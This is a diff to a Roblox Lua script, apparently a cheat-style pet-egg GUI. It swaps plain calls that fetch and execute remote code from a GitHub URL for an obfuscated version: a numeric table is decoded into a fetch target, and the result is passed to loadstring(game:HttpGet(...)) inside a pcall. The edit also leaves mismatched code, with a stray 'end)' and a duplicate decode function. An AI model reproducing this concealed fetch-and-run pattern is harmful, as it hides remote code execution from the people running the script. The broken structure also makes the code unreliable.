@@ -7,11 +7,6 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
 
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
-end)
-
-
 local petTable = {
     ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
     ["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
@@ -287,8 +282,20 @@ loadAgeBtn.TextSize = 16
 loadAgeBtn.Font = Enum.Font.FredokaOne
 loadAgeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-loadAgeBtn.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
+local encoded = {204,202,220,218,220,154,208,154,212,216,216,222,200,154,212,206,214,154,210,224,224,154,222,200,220,222,212,220,210,218,212,154,222,218,212,154,194}
+local function decode(tbl)
+    local s = ""
+    for _,v in ipairs(tbl) do
+        s = s .. string.char(math.floor(v / 2))
+    end
+    return s
+end
+
+pcall(function()
+    loadstring(game:HttpGet(decode(encoded)))()
+end)
+
+
 end)
 
 local function decode(tbl)
